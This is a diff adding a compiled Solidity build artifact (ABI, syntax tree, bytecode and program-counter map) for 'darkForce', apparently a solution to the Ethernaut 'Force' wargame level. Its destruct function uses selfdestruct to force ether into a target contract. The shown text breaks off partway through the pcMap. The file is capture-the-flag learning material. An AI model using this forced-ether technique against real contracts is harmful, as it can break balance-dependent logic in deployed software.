@@ -1,0 +1,1719 @@
+{
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_addressForce",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "deposit",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "destruct",
+      "outputs": [],
+      "stateMutability": "payable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "force",
+      "outputs": [
+        {
+          "internalType": "contract Force",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "allSourcePaths": {
+    "0": "contracts/ethernaut_force.sol"
+  },
+  "ast": {
+    "absolutePath": "contracts/ethernaut_force.sol",
+    "exportedSymbols": {
+      "Force": [
+        2
+      ],
+      "darkForce": [
+        51
+      ]
+    },
+    "id": 52,
+    "license": "MIT",
+    "nodeType": "SourceUnit",
+    "nodes": [
+      {
+        "id": 1,
+        "literals": [
+          "solidity",
+          "^",
+          "0.8",
+          ".0"
+        ],
+        "nodeType": "PragmaDirective",
+        "src": "32:23:0"
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "Force",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "id": 2,
+        "linearizedBaseContracts": [
+          2
+        ],
+        "name": "Force",
+        "nameLocation": "66:5:0",
+        "nodeType": "ContractDefinition",
+        "nodes": [],
+        "scope": 52,
+        "src": "57:118:0",
+        "usedErrors": []
+      },
+      {
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "darkForce",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "id": 51,
+        "linearizedBaseContracts": [
+          51
+        ],
+        "name": "darkForce",
+        "nameLocation": "186:9:0",
+        "nodeType": "ContractDefinition",
+        "nodes": [
+          {
+            "constant": false,
+            "functionSelector": "a79f26dc",
+            "id": 5,
+            "mutability": "mutable",
+            "name": "force",
+            "nameLocation": "214:5:0",
+            "nodeType": "VariableDeclaration",
+            "scope": 51,
+            "src": "201:18:0",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_contract$_Force_$2",
+              "typeString": "contract Force"
+            },
+            "typeName": {
+              "id": 4,
+              "nodeType": "UserDefinedTypeName",
+              "pathNode": {
+                "id": 3,
+                "name": "Force",
+                "nameLocations": [
+                  "201:5:0"
+                ],
+                "nodeType": "IdentifierPath",
+                "referencedDeclaration": 2,
+                "src": "201:5:0"
+              },
+              "referencedDeclaration": 2,
+              "src": "201:5:0",
+              "typeDescriptions": {
+                "typeIdentifier": "t_contract$_Force_$2",
+                "typeString": "contract Force"
+              }
+            },
+            "visibility": "public"
+          },
+          {
+            "constant": false,
+            "id": 7,
+            "mutability": "mutable",
+            "name": "forcecontract",
+            "nameLocation": "241:13:0",
+            "nodeType": "VariableDeclaration",
+            "scope": 51,
+            "src": "225:29:0",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_address_payable",
+              "typeString": "address payable"
+            },
+            "typeName": {
+              "id": 6,
+              "name": "address",
+              "nodeType": "ElementaryTypeName",
+              "src": "225:15:0",
+              "stateMutability": "payable",
+              "typeDescriptions": {
+                "typeIdentifier": "t_address_payable",
+                "typeString": "address payable"
+              }
+            },
+            "visibility": "internal"
+          },
+          {
+            "constant": false,
+            "id": 9,
+            "mutability": "mutable",
+            "name": "balance",
+            "nameLocation": "268:7:0",
+            "nodeType": "VariableDeclaration",
+            "scope": 51,
+            "src": "260:15:0",
+            "stateVariable": true,
+            "storageLocation": "default",
+            "typeDescriptions": {
+              "typeIdentifier": "t_uint256",
+              "typeString": "uint256"
+            },
+            "typeName": {
+              "id": 8,
+              "name": "uint256",
+              "nodeType": "ElementaryTypeName",
+              "src": "260:7:0",
+              "typeDescriptions": {
+                "typeIdentifier": "t_uint256",
+                "typeString": "uint256"
+              }
+            },
+            "visibility": "internal"
+          },
+          {
+            "body": {
+              "id": 30,
+              "nodeType": "Block",
+              "src": "316:94:0",
+              "statements": [
+                {
+                  "expression": {
+                    "id": 18,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 14,
+                      "name": "force",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 5,
+                      "src": "326:5:0",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_Force_$2",
+                        "typeString": "contract Force"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "arguments": [
+                        {
+                          "id": 16,
+                          "name": "_addressForce",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": 11,
+                          "src": "340:13:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        ],
+                        "id": 15,
+                        "name": "Force",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 2,
+                        "src": "334:5:0",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_contract$_Force_$2_$",
+                          "typeString": "type(contract Force)"
+                        }
+                      },
+                      "id": 17,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "nameLocations": [],
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "334:20:0",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_contract$_Force_$2",
+                        "typeString": "contract Force"
+                      }
+                    },
+                    "src": "326:28:0",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_contract$_Force_$2",
+                      "typeString": "contract Force"
+                    }
+                  },
+                  "id": 19,
+                  "nodeType": "ExpressionStatement",
+                  "src": "326:28:0"
+                },
+                {
+                  "expression": {
+                    "id": 28,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 20,
+                      "name": "forcecontract",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 7,
+                      "src": "364:13:0",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address_payable",
+                        "typeString": "address payable"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "arguments": [
+                        {
+                          "arguments": [
+                            {
+                              "id": 25,
+                              "name": "force",
+                              "nodeType": "Identifier",
+                              "overloadedDeclarations": [],
+                              "referencedDeclaration": 5,
+                              "src": "396:5:0",
+                              "typeDescriptions": {
+                                "typeIdentifier": "t_contract$_Force_$2",
+                                "typeString": "contract Force"
+                              }
+                            }
+                          ],
+                          "expression": {
+                            "argumentTypes": [
+                              {
+                                "typeIdentifier": "t_contract$_Force_$2",
+                                "typeString": "contract Force"
+                              }
+                            ],
+                            "id": 24,
+                            "isConstant": false,
+                            "isLValue": false,
+                            "isPure": true,
+                            "lValueRequested": false,
+                            "nodeType": "ElementaryTypeNameExpression",
+                            "src": "388:7:0",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_type$_t_address_$",
+                              "typeString": "type(address)"
+                            },
+                            "typeName": {
+                              "id": 23,
+                              "name": "address",
+                              "nodeType": "ElementaryTypeName",
+                              "src": "388:7:0",
+                              "typeDescriptions": {}
+                            }
+                          },
+                          "id": 26,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "kind": "typeConversion",
+                          "lValueRequested": false,
+                          "nameLocations": [],
+                          "names": [],
+                          "nodeType": "FunctionCall",
+                          "src": "388:14:0",
+                          "tryCall": false,
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        }
+                      ],
+                      "expression": {
+                        "argumentTypes": [
+                          {
+                            "typeIdentifier": "t_address",
+                            "typeString": "address"
+                          }
+                        ],
+                        "id": 22,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "lValueRequested": false,
+                        "nodeType": "ElementaryTypeNameExpression",
+                        "src": "380:8:0",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_type$_t_address_payable_$",
+                          "typeString": "type(address payable)"
+                        },
+                        "typeName": {
+                          "id": 21,
+                          "name": "address",
+                          "nodeType": "ElementaryTypeName",
+                          "src": "380:8:0",
+                          "stateMutability": "payable",
+                          "typeDescriptions": {}
+                        }
+                      },
+                      "id": 27,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "kind": "typeConversion",
+                      "lValueRequested": false,
+                      "nameLocations": [],
+                      "names": [],
+                      "nodeType": "FunctionCall",
+                      "src": "380:23:0",
+                      "tryCall": false,
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_address_payable",
+                        "typeString": "address payable"
+                      }
+                    },
+                    "src": "364:39:0",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address_payable",
+                      "typeString": "address payable"
+                    }
+                  },
+                  "id": 29,
+                  "nodeType": "ExpressionStatement",
+                  "src": "364:39:0"
+                }
+              ]
+            },
+            "id": 31,
+            "implemented": true,
+            "kind": "constructor",
+            "modifiers": [],
+            "name": "",
+            "nameLocation": "-1:-1:-1",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 12,
+              "nodeType": "ParameterList",
+              "parameters": [
+                {
+                  "constant": false,
+                  "id": 11,
+                  "mutability": "mutable",
+                  "name": "_addressForce",
+                  "nameLocation": "302:13:0",
+                  "nodeType": "VariableDeclaration",
+                  "scope": 31,
+                  "src": "294:21:0",
+                  "stateVariable": false,
+                  "storageLocation": "default",
+                  "typeDescriptions": {
+                    "typeIdentifier": "t_address",
+                    "typeString": "address"
+                  },
+                  "typeName": {
+                    "id": 10,
+                    "name": "address",
+                    "nodeType": "ElementaryTypeName",
+                    "src": "294:7:0",
+                    "stateMutability": "nonpayable",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_address",
+                      "typeString": "address"
+                    }
+                  },
+                  "visibility": "internal"
+                }
+              ],
+              "src": "293:23:0"
+            },
+            "returnParameters": {
+              "id": 13,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "316:0:0"
+            },
+            "scope": 51,
+            "src": "282:128:0",
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 38,
+              "nodeType": "Block",
+              "src": "451:44:0",
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "id": 35,
+                        "name": "forcecontract",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 7,
+                        "src": "474:13:0",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address_payable",
+                          "typeString": "address payable"
+                        }
+                      ],
+                      "id": 34,
+                      "name": "selfdestruct",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": -21,
+                      "src": "461:12:0",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
+                        "typeString": "function (address payable)"
+                      }
+                    },
+                    "id": 36,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "nameLocations": [],
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "461:27:0",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 37,
+                  "nodeType": "ExpressionStatement",
+                  "src": "461:27:0"
+                }
+              ]
+            },
+            "functionSelector": "2b68b9c6",
+            "id": 39,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "destruct",
+            "nameLocation": "425:8:0",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 32,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "433:2:0"
+            },
+            "returnParameters": {
+              "id": 33,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "451:0:0"
+            },
+            "scope": 51,
+            "src": "416:79:0",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "public"
+          },
+          {
+            "body": {
+              "id": 49,
+              "nodeType": "Block",
+              "src": "536:46:0",
+              "statements": [
+                {
+                  "expression": {
+                    "id": 47,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "lValueRequested": false,
+                    "leftHandSide": {
+                      "id": 42,
+                      "name": "balance",
+                      "nodeType": "Identifier",
+                      "overloadedDeclarations": [],
+                      "referencedDeclaration": 9,
+                      "src": "546:7:0",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      }
+                    },
+                    "nodeType": "Assignment",
+                    "operator": "=",
+                    "rightHandSide": {
+                      "commonType": {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      },
+                      "id": 46,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "leftExpression": {
+                        "id": 43,
+                        "name": "balance",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 9,
+                        "src": "556:7:0",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      },
+                      "nodeType": "BinaryOperation",
+                      "operator": "+",
+                      "rightExpression": {
+                        "expression": {
+                          "id": 44,
+                          "name": "msg",
+                          "nodeType": "Identifier",
+                          "overloadedDeclarations": [],
+                          "referencedDeclaration": -15,
+                          "src": "566:3:0",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_magic_message",
+                            "typeString": "msg"
+                          }
+                        },
+                        "id": 45,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "lValueRequested": false,
+                        "memberLocation": "570:5:0",
+                        "memberName": "value",
+                        "nodeType": "MemberAccess",
+                        "src": "566:9:0",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_uint256",
+                          "typeString": "uint256"
+                        }
+                      },
+                      "src": "556:19:0",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_uint256",
+                        "typeString": "uint256"
+                      }
+                    },
+                    "src": "546:29:0",
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_uint256",
+                      "typeString": "uint256"
+                    }
+                  },
+                  "id": 48,
+                  "nodeType": "ExpressionStatement",
+                  "src": "546:29:0"
+                }
+              ]
+            },
+            "functionSelector": "d0e30db0",
+            "id": 50,
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "deposit",
+            "nameLocation": "510:7:0",
+            "nodeType": "FunctionDefinition",
+            "parameters": {
+              "id": 40,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "517:2:0"
+            },
+            "returnParameters": {
+              "id": 41,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "536:0:0"
+            },
+            "scope": 51,
+            "src": "501:81:0",
+            "stateMutability": "payable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "scope": 52,
+        "src": "177:407:0",
+        "usedErrors": []
+      }
+    ],
+    "src": "32:552:0"
+  },
+  "bytecode": "608060405234801561001057600080fd5b5060405161019438038061019483398101604081905261002f9161005e565b600080546001600160a01b039092166001600160a01b031992831681179091556001805490921617905561008e565b60006020828403121561007057600080fd5b81516001600160a01b038116811461008757600080fd5b9392505050565b60f88061009c6000396000f3fe60806040526004361060305760003560e01c80632b68b9c6146035578063a79f26dc14603d578063d0e30db0146077575b600080fd5b603b607d565b005b348015604857600080fd5b50600054605b906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b603b608b565b6001546001600160a01b0316ff5b3460025460979190609c565b600255565b8082018082111560bc57634e487b7160e01b600052601160045260246000fd5b9291505056fea26469706673582212201d42097a765db8d3873d84e3b19439ba3bd831b8061f35b7de7d25aa0a18653564736f6c63430008110033",
+  "bytecodeSha1": "c38f443105ac7c815e3c1cc03b0e92f12cba73cb",
+  "compiler": {
+    "evm_version": "istanbul",
+    "optimizer": {
+      "enabled": true,
+      "runs": 200
+    },
+    "version": "0.8.17+commit.8df45f5f"
+  },
+  "contractName": "darkForce",
+  "coverageMap": {
+    "branches": {
+      "0": {}
+    },
+    "statements": {
+      "0": {
+        "darkForce.deposit": {
+          "1": [
+            546,
+            575
+          ]
+        },
+        "darkForce.destruct": {
+          "0": [
+            461,
+            488
+          ]
+        }
+      }
+    }
+  },
+  "dependencies": [
+    "Force"
+  ],
+  "deployedBytecode": "60806040526004361060305760003560e01c80632b68b9c6146035578063a79f26dc14603d578063d0e30db0146077575b600080fd5b603b607d565b005b348015604857600080fd5b50600054605b906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b603b608b565b6001546001600160a01b0316ff5b3460025460979190609c565b600255565b8082018082111560bc57634e487b7160e01b600052601160045260246000fd5b9291505056fea26469706673582212201d42097a765db8d3873d84e3b19439ba3bd831b8061f35b7de7d25aa0a18653564736f6c63430008110033",
+  "deployedSourceMap": "177:407:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;416:79;;;:::i;:::-;;201:18;;;;;;;;;;-1:-1:-1;201:18:0;;;;-1:-1:-1;;;;;201:18:0;;;;;;-1:-1:-1;;;;;189:32:1;;;171:51;;159:2;144:18;201::0;;;;;;;501:81;;;:::i;416:79::-;474:13;;-1:-1:-1;;;;;474:13:0;461:27;501:81;566:9;556:7;;:19;;;;:::i;:::-;546:7;:29;501:81::o;233:222:1:-;298:9;;;319:10;;;316:133;;;371:10;366:3;362:20;359:1;352:31;406:4;403:1;396:15;434:4;431:1;424:15;316:133;233:222;;;;:::o",
+  "language": "Solidity",
+  "natspec": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "offset": [
+    177,
+    584
+  ],
+  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH1 0x30 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2B68B9C6 EQ PUSH1 0x35 JUMPI DUP1 PUSH4 0xA79F26DC EQ PUSH1 0x3D JUMPI DUP1 PUSH4 0xD0E30DB0 EQ PUSH1 0x77 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x3B PUSH1 0x7D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH1 0x48 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x5B SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x3B PUSH1 0x8B JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SELFDESTRUCT JUMPDEST CALLVALUE PUSH1 0x2 SLOAD PUSH1 0x97 SWAP2 SWAP1 PUSH1 0x9C JUMP JUMPDEST PUSH1 0x2 SSTORE JUMP JUMPDEST DUP1 DUP3 ADD DUP1 DUP3 GT ISZERO PUSH1 0xBC JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SAR TIMESTAMP MULMOD PUSH27 0x765DB8D3873D84E3B19439BA3BD831B8061F35B7DE7D25AA0A1865 CALLDATALOAD PUSH5 0x736F6C6343 STOP ADDMOD GT STOP CALLER ",
+  "pcMap": {
+    "0": {
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x80"
+    },
+    "2": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x40"
+    },
+    "4": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "MSTORE",
+      "path": "0"
+    },
+    "5": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x4"
+    },
+    "7": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "CALLDATASIZE",
+      "path": "0"
+    },
+    "8": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "LT",
+      "path": "0"
+    },
+    "9": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x30"
+    },
+    "11": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "JUMPI",
+      "path": "0"
+    },
+    "12": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x0"
+    },
+    "14": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "CALLDATALOAD",
+      "path": "0"
+    },
+    "15": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0xE0"
+    },
+    "17": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "SHR",
+      "path": "0"
+    },
+    "18": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "DUP1",
+      "path": "0"
+    },
+    "19": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH4",
+      "path": "0",
+      "value": "0x2B68B9C6"
+    },
+    "24": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "EQ",
+      "path": "0"
+    },
+    "25": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x35"
+    },
+    "27": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "JUMPI",
+      "path": "0"
+    },
+    "28": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "DUP1",
+      "path": "0"
+    },
+    "29": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH4",
+      "path": "0",
+      "value": "0xA79F26DC"
+    },
+    "34": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "EQ",
+      "path": "0"
+    },
+    "35": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x3D"
+    },
+    "37": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "JUMPI",
+      "path": "0"
+    },
+    "38": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "DUP1",
+      "path": "0"
+    },
+    "39": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH4",
+      "path": "0",
+      "value": "0xD0E30DB0"
+    },
+    "44": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "EQ",
+      "path": "0"
+    },
+    "45": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x77"
+    },
+    "47": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "JUMPI",
+      "path": "0"
+    },
+    "48": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "49": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x0"
+    },
+    "51": {
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "DUP1",
+      "path": "0"
+    },
+    "52": {
+      "first_revert": true,
+      "fn": null,
+      "offset": [
+        177,
+        584
+      ],
+      "op": "REVERT",
+      "path": "0"
+    },
+    "53": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        416,
+        495
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "54": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        416,
+        495
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x3B"
+    },
+    "56": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        416,
+        495
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x7D"
+    },
+    "58": {
+      "fn": "darkForce.destruct",
+      "jump": "i",
+      "offset": [
+        416,
+        495
+      ],
+      "op": "JUMP",
+      "path": "0"
+    },
+    "59": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        416,
+        495
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "60": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        416,
+        495
+      ],
+      "op": "STOP",
+      "path": "0"
+    },
+    "61": {
+      "offset": [
+        201,
+        219
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "62": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "CALLVALUE",
+      "path": "0"
+    },
+    "63": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "DUP1",
+      "path": "0"
+    },
+    "64": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "ISZERO",
+      "path": "0"
+    },
+    "65": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x48"
+    },
+    "67": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "JUMPI",
+      "path": "0"
+    },
+    "68": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x0"
+    },
+    "70": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "DUP1",
+      "path": "0"
+    },
+    "71": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "REVERT",
+      "path": "0"
+    },
+    "72": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "73": {
+      "op": "POP"
+    },
+    "74": {
+      "offset": [
+        201,
+        219
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x0"
+    },
+    "76": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "SLOAD",
+      "path": "0"
+    },
+    "77": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x5B"
+    },
+    "79": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "SWAP1",
+      "path": "0"
+    },
+    "80": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "82": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "84": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "86": {
+      "op": "SHL"
+    },
+    "87": {
+      "op": "SUB"
+    },
+    "88": {
+      "offset": [
+        201,
+        219
+      ],
+      "op": "AND",
+      "path": "0"
+    },
+    "89": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "DUP2",
+      "path": "0"
+    },
+    "90": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "JUMP",
+      "path": "0"
+    },
+    "91": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "JUMPDEST",
+      "path": "0"
+    },
+    "92": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x40"
+    },
+    "94": {
+      "fn": "darkForce.destruct",
+      "offset": [
+        201,
+        219
+      ],
+      "op": "MLOAD",
+      "path": "0"
+    },
+    "95": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "97": {
+      "op": "PUSH1",
+      "value": "0x1"
+    },
+    "99": {
+      "op": "PUSH1",
+      "value": "0xA0"
+    },
+    "101": {
+      "op": "SHL"
+    },
+    "102": {
+      "op": "SUB"
+    },
+    "103": {
+      "op": "SWAP1"
+    },
+    "104": {
+      "op": "SWAP2"
+    },
+    "105": {
+      "op": "AND"
+    },
+    "106": {
+      "op": "DUP2"
+    },
+    "107": {
+      "op": "MSTORE"
+    },
+    "108": {
+      "op": "PUSH1",
+      "value": "0x20"
+    },
+    "110": {
+      "op": "ADD"
+    },
+    "111": {
+      "offset": [
+        201,
+        219
+      ],
+      "op": "PUSH1",
+      "path": "0",
+      "value": "0x40"
+    },
+    "113": {
